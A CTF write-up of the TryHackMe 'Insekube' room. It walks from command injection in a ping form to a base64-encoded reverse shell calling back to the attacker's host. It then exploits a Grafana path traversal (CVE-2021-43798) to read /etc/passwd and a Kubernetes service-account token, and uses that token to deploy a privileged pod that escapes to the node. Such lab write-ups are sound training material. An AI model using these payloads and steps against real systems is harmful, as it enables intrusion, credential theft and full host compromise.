---
title: Insekube
author: CYB3RM3
name: CYB3RM3 | Insekube
date: 2022-03-01 15:30:02 +0100
categories: [TryHackMe, Web]
tags: [Web, LFI]
---

Exploiting Kubernetes by leveraging a Grafana LFI vulnerability

THM Room [https://tryhackme.com/room/insekube](https://tryhackme.com/room/insekube)

## TASK1 : Introduction
## What ports are open? (comma separated) 

```console
root@ip-10-10-78-131:~# nmap -sC -vv 10.10.85.60

Starting Nmap 7.60 ( https://nmap.org ) at 2022-02-28 13:23 GMT
NSE: Loaded 118 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 13:23
Completed NSE at 13:23, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 13:23
Completed NSE at 13:23, 0.00s elapsed
Initiating ARP Ping Scan at 13:23
Scanning 10.10.85.60 [1 port]
Completed ARP Ping Scan at 13:23, 0.22s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:23
Completed Parallel DNS resolution of 1 host. at 13:23, 0.00s elapsed
Initiating SYN Stealth Scan at 13:23
Scanning ip-10-10-85-60.eu-west-1.compute.internal (10.10.85.60) [1000 ports]
Discovered open port 80/tcp on 10.10.85.60
Discovered open port 22/tcp on 10.10.85.60
Completed SYN Stealth Scan at 13:23, 1.28s elapsed (1000 total ports)
NSE: Script scanning 10.10.85.60.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 13:23
Completed NSE at 13:23, 0.18s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 13:23
Completed NSE at 13:23, 0.00s elapsed
Nmap scan report for ip-10-10-85-60.eu-west-1.compute.internal (10.10.85.60)
Host is up, received arp-response (0.00085s latency).
Scanned at 2022-02-28 13:23:29 GMT for 2s
Not shown: 998 closed ports
Reason: 998 resets
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 62
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
MAC Address: 02:2B:6E:3E:68:F1 (Unknown)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 13:23
Completed NSE at 13:23, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 13:23
Completed NSE at 13:23, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.98 seconds
           Raw packets sent: 1002 (44.072KB) | Rcvd: 1002 (40.076KB)
```
{: .nolineno }


Answer : 22,80

## TASK2 : RCE
### Visit the website, it takes a host and returns the output of a ping command.  Use command injection to get a reverse shell. [...] You will find the flag in an environment variable. What is flag 1 ?
The website do ping on the ip we put in the form. I checked if i could exploit this form by adding an ls command injection :

![Command Injection](/images/thm/insekube/insekube_1.png)
_Command Injection_

It shows the ls return. The hint for flag 1 is that the flag is stored in the environment variable, so let's print those with the "printenv" command :

![Environment Variables](/images/thm/insekube/insekube_2.png)
_Environment Variables_

I found this command after the revshell access i'll detail after.

For accessing the webserver from a reverse shell, i tried to direct netcat from the form with a listener on kali but it didn't work. So i tried to encode the basic revshell (bash -i) from revshell.com <https://www.revshells.com/> to base64 :

```console
root@ip-10-10-79-165:~# echo "sh -i >& /dev/tcp/10.10.79.165/5555 0>&1" | base64 > test.txt
root@ip-10-10-79-165:~# cat test.txt 
c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuNzkuMTY1LzU1NTUgMD4mMQo=
root@ip-10-10-79-165:~# base64 -d test.txt 
sh -i >& /dev/tcp/10.10.79.165/5555 0>&1
```
{: .nolineno }

Then i used this paylod as command injection with the echo command :

```console
;echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuNzkuMTY1LzU1NTUgMD4mMQo= | base64 -d | bash
```
{: .nolineno }

![Reverse Shell](/images/thm/insekube/insekube_3.png)
_Reverse Shell_

This worked and i got a reverse shell. I printed the environment variables with the "env" (or "printenv") command :

```console
$ env
KUBERNETES_SERVICE_PORT=443
KUBERNETES_PORT=tcp://10.96.0.1:443
HOSTNAME=syringe-79b66d66d7-7mxhd
GRAFANA_PORT_3000_TCP_ADDR=10.108.133.228
SHLVL=1
HOME=/home/challenge
GRAFANA_PORT_3000_TCP_PORT=3000
GRAFANA_PORT_3000_TCP_PROTO=tcp
SYRINGE_PORT_3000_TCP_ADDR=10.99.16.179
SYRINGE_PORT_3000_TCP_PORT=3000
SYRINGE_PORT_3000_TCP_PROTO=tcp
GRAFANA_PORT_3000_TCP=tcp://10.108.133.228:3000
_=id
GRAFANA_SERVICE_HOST=10.108.133.228
KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
PATH=/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
KUBERNETES_PORT_443_TCP_PORT=443
SYRINGE_PORT_3000_TCP=tcp://10.99.16.179:3000
KUBERNETES_PORT_443_TCP_PROTO=tcp
GRAFANA_PORT=tcp://10.108.133.228:3000
SYRINGE_SERVICE_HOST=10.99.16.179
GRAFANA_SERVICE_PORT=3000
KUBERNETES_SERVICE_PORT_HTTPS=443
SYRINGE_PORT=tcp://10.99.16.179:3000
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
SYRINGE_SERVICE_PORT=3000
PWD=/home/challenge
KUBERNETES_SERVICE_HOST=10.96.0.1
GOLANG_VERSION=1.15.7
FLAG=flag{5e7cc6165f6c2058b11710a26691bb6b}
```
{: .nolineno }

Answer : flag{5e7cc6165f6c2058b11710a26691bb6b}

## TASK3 : Interacting with kubernetes 
### No answer needed 
A little reading.

No Answer.

## TASK4 : Kubernetes Secrets 
### What is flag 2 ? 
Flag 2 was hidden in a Kubernetes secret as a base64 encoded.

First i needed to list all secrets :

```console
$ ./kubectl get secrets     
NAME                    TYPE                                  DATA   AGE
default-token-8bksk     kubernetes.io/service-account-token   3      52d
developer-token-74lck   kubernetes.io/service-account-token   3      52d
secretflag              Opaque                                1      52d
syringe-token-g85mg     kubernetes.io/service-account-token   3      52d
```
{: .nolineno }

One seems interresting with his obvious name "secretflag", so let's check his description :

```console
$ ./kubectl describe secret secretflag
Name:         secretflag
Namespace:    default
Labels:       <none>
Annotations:  <none>

Type:  Opaque

Data
====
flag:  38 bytes
```
{: .nolineno }

This secret is not empty, we can print this entirely :

```console
$ ./kubectl get secret secretflag -o 'json'
{
    "apiVersion": "v1",
    "data": {
        "flag": "ZmxhZ3tkZjJhNjM2ZGUxNTEwOGE0ZGM0MTEzNWQ5MzBkOGVjMX0="
    },
    "kind": "Secret",
    "metadata": {
        "annotations": {
            "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"data\":{\"flag\":\"ZmxhZ3tkZjJhNjM2ZGUxNTEwOGE0ZGM0MTEzNWQ5MzBkOGVjMX0=\"},\"kind\":\"Secret\",\"metadata\":{\"annotations\":{},\"name\":\"secretflag\",\"namespace\":\"default\"},\"type\":\"Opaque\"}\n"
        },
        "creationTimestamp": "2022-01-06T23:41:19Z",
        "name": "secretflag",
        "namespace": "default",
        "resourceVersion": "562",
        "uid": "6384b135-4628-4693-b269-4e50bfffdf21"
    },
    "type": "Opaque"
}
```
{: .nolineno }

I got the base64 encoded flag : 

```console
ZmxhZ3tkZjJhNjM2ZGUxNTEwOGE0ZGM0MTEzNWQ5MzBkOGVjMX0=
```
{: .nolineno }

Once decoded :

```console
root@ip-10-10-79-165:~# echo "ZmxhZ3tkZjJhNjM2ZGUxNTEwOGE0ZGM0MTEzNWQ5MzBkOGVjMX0=" > flag2.txt
root@ip-10-10-79-165:~# base64 -d flag2.txt 
flag{df2a636de15108a4dc41135d930d8ec1}
```
{: .nolineno }

Answer : flag{df2a636de15108a4dc41135d930d8ec1}

## TASK5 : Recon in the cluster 
### What is the version of Grafana running on the machine?
In the environment variables, we can see a GRAFANA entry :

```console
GRAFANA_PORT=tcp://10.108.133.228:3000
```
{: .nolineno }

So i looked at this ip:port with curl and got an error with /login specified. I then added /login to my search and tried to find the version. I don't see it immediately so i add a grep comand :

```console
curl http://grafana:3000/login | grep version
```
{: .nolineno }

![Grafana Version](/images/thm/insekube/insekube_4.png)
_Grafana Version_

Answer : 8.3.0-beta2

### What is the CVE you've found?

Just googling these keywords : "grafana 8.3.0-beta2 exploit CVE" :

![Grafana Vulnerability](/images/thm/insekube/insekube_5.png)
_Grafana Vulnerability_

Answer : CVE-2021-43798

## TASK6 : Lateral Movement 
### What is the name of the service account running the Grafana service? 
Done some researched on the CVE and found a vulnerable path trought REDHAT doocumentations <https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2021-43798>:

![Vulnerable path](/images/thm/insekube/insekube_6.png)
_Vulnerable path_

Now can i access /etc/passwd for example with this path trasversal vulnerability ?

Found an example <https://golangexample.com/cve-2021-43798-grafana-8-x-path-traversal-pre-auth/> of the path traversal using (CVE-2021-43798) :

![Example](/images/thm/insekube/insekube_7.png)
_Example_

The vulnerability can be test with a curl call :

![Verify if exploitable](/images/thm/insekube/insekube_8.png)
_Verify if exploitable_

My curl call will be :

```console
$ curl --path-as-is http://10.108.133.228:3000/public/plugins/alertlist/../../../../../../../../etc/passwd
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1230  100  1230    0     0   300k      0 --:--:-- --:--:-- --:--:--  400k
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
grafana:x:472:0:Linux User,,,:/home/grafana:/sbin/nologin
```
{: .nolineno }

It works. I can grab now the token  :

"Kubernetes stores the token of the service account running a pod in /var/run/secrets/kubernetes.io/serviceaccount/token"

New curl :

```console
$ curl --path-as-is http://10.108.133.228:3000/public/plugins/alertlist/../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1022  100  1022    0     0   499k      0 --:--:-- --:--:-- --:--:--  499k
eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3Njc2MjMyLCJpYXQiOjE2NDYxNDAyMzIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDYxNDM4Mzl9LCJuYmYiOjE2NDYxNDAyMzIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.DPFmKXMd4Cp_FQR8iNKNjZ8V1lz2FgyA08eJ5jj_eD-WvlAEhXYU3wNuoPNsJiB8SwBB0XNNV-qLPdVVssoI6u7QyaIgJmcb4KEFAqK_f3WGx8UX01Bwb5IW5i-JGlGWOu1BV6ZkbmPeTtnj7nBLnxNK6zuuAXUtmSv4MlwKxb5AbbfSWkwLqVoZKezTdQkTb3ZI4MEgX6sGUSpmh0OZWD7gi3zvuW0Cox-FSUOxcMSRSjFnIWs5Wgt2ZDa9AtS2WVg7qakG9pgAxXYYp-bhIRVW1QGoMp5R1ldujaJGL90jl548Z6z-GxRFxAy_NjP06NHLpPH1WKqjfNzHwfhk7w
```
{: .nolineno }

Token for kubernetes are stored as JSON Web token. I can use jwt.io <https://jwt.io/> to decode this token :

![JWEB token](/images/thm/insekube/insekube_9.png)
_JWEB token_

I got the service account.

Answer : developer

### How many pods are running?

```console
$ ./kubectl get pods --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3Njc2MjMyLCJpYXQiOjE2NDYxNDAyMzIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDYxNDM4Mzl9LCJuYmYiOjE2NDYxNDAyMzIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.DPFmKXMd4Cp_FQR8iNKNjZ8V1lz2FgyA08eJ5jj_eD-WvlAEhXYU3wNuoPNsJiB8SwBB0XNNV-qLPdVVssoI6u7QyaIgJmcb4KEFAqK_f3WGx8UX01Bwb5IW5i-JGlGWOu1BV6ZkbmPeTtnj7nBLnxNK6zuuAXUtmSv4MlwKxb5AbbfSWkwLqVoZKezTdQkTb3ZI4MEgX6sGUSpmh0OZWD7gi3zvuW0Cox-FSUOxcMSRSjFnIWs5Wgt2ZDa9AtS2WVg7qakG9pgAxXYYp-bhIRVW1QGoMp5R1ldujaJGL90jl548Z6z-GxRFxAy_NjP06NHLpPH1WKqjfNzHwfhk7w
NAME                       READY   STATUS    RESTARTS       AGE
grafana-57454c95cb-v4nrk   1/1     Running   10 (29d ago)   53d
syringe-79b66d66d7-7mxhd   1/1     Running   1 (29d ago)    29d
```
{: .nolineno }

Answer : 2

### What is flag 3?

To achieve flag 3, i needed a shell in the Grafana pod, as explained in the room :

Use kubectl exec to get a shell in the Grafana pod. You will find flag 3 in the environment variables.
Insekube :

```console
challenge@syringe:/tmp$ ./kubectl exec -it grafana-57454c95cb-v4nrk --token=${TOKEN} -- /bin/bash
Unable to use a TTY - input is not a terminal or the right kind of file
hostname
grafana-57454c95cb-v4nrk
```
{: .nolineno }

```console
$ ./kubectl exec -it grafana-57454c95cb-v4nrk --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3Njc2MjMyLCJpYXQiOjE2NDYxNDAyMzIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDYxNDM4Mzl9LCJuYmYiOjE2NDYxNDAyMzIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.DPFmKXMd4Cp_FQR8iNKNjZ8V1lz2FgyA08eJ5jj_eD-WvlAEhXYU3wNuoPNsJiB8SwBB0XNNV-qLPdVVssoI6u7QyaIgJmcb4KEFAqK_f3WGx8UX01Bwb5IW5i-JGlGWOu1BV6ZkbmPeTtnj7nBLnxNK6zuuAXUtmSv4MlwKxb5AbbfSWkwLqVoZKezTdQkTb3ZI4MEgX6sGUSpmh0OZWD7gi3zvuW0Cox-FSUOxcMSRSjFnIWs5Wgt2ZDa9AtS2WVg7qakG9pgAxXYYp-bhIRVW1QGoMp5R1ldujaJGL90jl548Z6z-GxRFxAy_NjP06NHLpPH1WKqjfNzHwfhk7w -- /bin/bash
Unable to use a TTY - input is not a terminal or the right kind of file
hostname
grafana-57454c95cb-v4nrk
env
KUBERNETES_SERVICE_PORT_HTTPS=443
GRAFANA_SERVICE_HOST=10.108.133.228
KUBERNETES_SERVICE_PORT=443
HOSTNAME=grafana-57454c95cb-v4nrk
SYRINGE_PORT=tcp://10.99.16.179:3000
GRAFANA_PORT=tcp://10.108.133.228:3000
SYRINGE_SERVICE_HOST=10.99.16.179
SYRINGE_PORT_3000_TCP=tcp://10.99.16.179:3000
GRAFANA_PORT_3000_TCP=tcp://10.108.133.228:3000
PWD=/usr/share/grafana
GF_PATHS_HOME=/usr/share/grafana
SYRINGE_PORT_3000_TCP_PROTO=tcp
HOME=/home/grafana
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
FLAG=flag{288232b2f03b1ec422c5dae50f14061f}
SHLVL=1
SYRINGE_PORT_3000_TCP_PORT=3000
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GRAFANA_PORT_3000_TCP_PORT=3000
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
GRAFANA_SERVICE_PORT=3000
SYRINGE_PORT_3000_TCP_ADDR=10.99.16.179
SYRINGE_SERVICE_PORT=3000
GF_PATHS_DATA=/var/lib/grafana
KUBERNETES_SERVICE_HOST=10.96.0.1
KUBERNETES_PORT=tcp://10.96.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
GF_PATHS_LOGS=/var/log/grafana
GRAFANA_PORT_3000_TCP_PROTO=tcp
PATH=/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
GRAFANA_PORT_3000_TCP_ADDR=10.108.133.228
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
_=/usr/bin/env
```
{: .nolineno }

Answer : flag{288232b2f03b1ec422c5dae50f14061f}

## TASK7 : Escape to the node 

### What is root.txt? 

Using the link provided <https://github.com/BishopFox/badPods/blob/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml> for the bad pod, i added the "imagePullPolicy: IfNotPresent" condition and encoded it to base64 for easier copy on the server :

![Base64 Encoding](/images/thm/insekube/insekube_10.png)
_Base64 Encoding_

```console
$ echo "YXBpVmVyc2lvbjogdjEKa2luZDogUG9kCm1ldGFkYXRhOgogIG5hbWU6IGV2ZXJ5dGhpbmctYWxsb3dlZC1leGVjLXBvZAogIGxhYmVsczoKICAgIGFwcDogcGVudGVzdApzcGVjOgogIGhvc3ROZXR3b3JrOiB0cnVlCiAgaG9zdFBJRDogdHJ1ZQogIGhvc3RJUEM6IHRydWUKICBjb250YWluZXJzOgogIC0gbmFtZTogZXZlcnl0aGluZy1hbGxvd2VkLXBvZAogICAgaW1hZ2U6IHVidW50dQogICAgaW1hZ2VQdWxsUG9saWN5OiBJZk5vdFByZXNlbnQKICAgIHNlY3VyaXR5Q29udGV4dDoKICAgICAgcHJpdmlsZWdlZDogdHJ1ZQogICAgdm9sdW1lTW91bnRzOgogICAgLSBtb3VudFBhdGg6IC9ob3N0CiAgICAgIG5hbWU6IG5vZGVyb290CiAgICBjb21tYW5kOiBbICIvYmluL3NoIiwgIi1jIiwgIi0tIiBdCiAgICBhcmdzOiBbICJ3aGlsZSB0cnVlOyBkbyBzbGVlcCAzMDsgZG9uZTsiIF0KICAjbm9kZU5hbWU6IGs4cy1jb250cm9sLXBsYW5lLW5vZGUgIyBGb3JjZSB5b3VyIHBvZCB0byBydW4gb24gdGhlIGNvbnRyb2wtcGxhbmUgbm9kZSBieSB1bmNvbW1lbnRpbmcgdGhpcyBsaW5lIGFuZCBjaGFuZ2luZyB0byBhIGNvbnRyb2wtcGxhbmUgbm9kZSBuYW1lCiAgdm9sdW1lczoKICAtIG5hbWU6IG5vZGVyb290CiAgICBob3N0UGF0aDoKICAgICAgcGF0aDogLwo=" > test.txt
$ base64 -d test.txt > privesc.yml

$ ./kubectl apply -f privesc.yml --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3Njc2MjMyLCJpYXQiOjE2NDYxNDAyMzIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDYxNDM4Mzl9LCJuYmYiOjE2NDYxNDAyMzIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.DPFmKXMd4Cp_FQR8iNKNjZ8V1lz2FgyA08eJ5jj_eD-WvlAEhXYU3wNuoPNsJiB8SwBB0XNNV-qLPdVVssoI6u7QyaIgJmcb4KEFAqK_f3WGx8UX01Bwb5IW5i-JGlGWOu1BV6ZkbmPeTtnj7nBLnxNK6zuuAXUtmSv4MlwKxb5AbbfSWkwLqVoZKezTdQkTb3ZI4MEgX6sGUSpmh0OZWD7gi3zvuW0Cox-FSUOxcMSRSjFnIWs5Wgt2ZDa9AtS2WVg7qakG9pgAxXYYp-bhIRVW1QGoMp5R1ldujaJGL90jl548Z6z-GxRFxAy_NjP06NHLpPH1WKqjfNzHwfhk7w
pod/everything-allowed-exec-pod created

$ ./kubectl get pods --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3Njc2MjMyLCJpYXQiOjE2NDYxNDAyMzIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDYxNDM4Mzl9LCJuYmYiOjE2NDYxNDAyMzIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.DPFmKXMd4Cp_FQR8iNKNjZ8V1lz2FgyA08eJ5jj_eD-WvlAEhXYU3wNuoPNsJiB8SwBB0XNNV-qLPdVVssoI6u7QyaIgJmcb4KEFAqK_f3WGx8UX01Bwb5IW5i-JGlGWOu1BV6ZkbmPeTtnj7nBLnxNK6zuuAXUtmSv4MlwKxb5AbbfSWkwLqVoZKezTdQkTb3ZI4MEgX6sGUSpmh0OZWD7gi3zvuW0Cox-FSUOxcMSRSjFnIWs5Wgt2ZDa9AtS2WVg7qakG9pgAxXYYp-bhIRVW1QGoMp5R1ldujaJGL90jl548Z6z-GxRFxAy_NjP06NHLpPH1WKqjfNzHwfhk7w
NAME                          READY   STATUS    RESTARTS       AGE
everything-allowed-exec-pod   1/1     Running   0              2m20s
grafana-57454c95cb-v4nrk      1/1     Running   10 (29d ago)   53d
syringe-79b66d66d7-7mxhd      1/1     Running   1 (29d ago)    29d

$ ./kubectl exec -it everything-allowed-exec-pod --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3Njc2MjMyLCJpYXQiOjE2NDYxNDAyMzIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDYxNDM4Mzl9LCJuYmYiOjE2NDYxNDAyMzIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.DPFmKXMd4Cp_FQR8iNKNjZ8V1lz2FgyA08eJ5jj_eD-WvlAEhXYU3wNuoPNsJiB8SwBB0XNNV-qLPdVVssoI6u7QyaIgJmcb4KEFAqK_f3WGx8UX01Bwb5IW5i-JGlGWOu1BV6ZkbmPeTtnj7nBLnxNK6zuuAXUtmSv4MlwKxb5AbbfSWkwLqVoZKezTdQkTb3ZI4MEgX6sGUSpmh0OZWD7gi3zvuW0Cox-FSUOxcMSRSjFnIWs5Wgt2ZDa9AtS2WVg7qakG9pgAxXYYp-bhIRVW1QGoMp5R1ldujaJGL90jl548Z6z-GxRFxAy_NjP06NHLpPH1WKqjfNzHwfhk7w -- /bin/bash
Unable to use a TTY - input is not a terminal or the right kind of file
hostname
minikube

find / -type f -name root.txt 2>/dev/null
/host/root/root.txt
cat /host/root/root.txt
flag{30180a273e7da821a7fe4af22ffd1701}
```
{: .nolineno }

Answer : flag{30180a273e7da821a7fe4af22ffd1701}